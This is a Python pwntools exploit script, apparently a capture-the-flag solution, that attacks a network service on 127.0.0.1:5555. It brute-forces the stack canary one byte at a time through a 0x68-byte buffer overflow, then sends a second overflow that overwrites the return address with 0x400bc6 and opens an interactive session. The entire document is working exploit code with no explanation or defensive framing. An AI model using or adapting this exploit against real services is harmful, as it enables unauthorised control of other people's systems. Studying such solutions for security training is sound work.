from pwn import *

def leak_canary():
    canary = ''
    while len(canary) != 8:
        for j in range(255):
            try:
                p = remote('127.0.0.1', 5555)
                p.recvuntil(b'Welcome!\n')
                payload = 'a' * (0x68) + canary + chr(j)
                p.send(payload)
                msg = p.recvuntil(b'\n')
                if b'received' in msg:
                    canary += chr(j)
                    p.close()
                    break
                p.close()
            except:
                p.close()
    print(canary)
    return u64(canary.ljust(8, '\x00'))

def pwn():
    canary = leak_canary()
    p = remote('127.0.0.1', 5555)
    p.recvuntil(b'Welcome!\n')
    payload = b'a' * (0x68) + p64(canary) + b'a' * 8 + p64(0x400bc6)
    p.send(payload)
    p.interactive()

pwn()
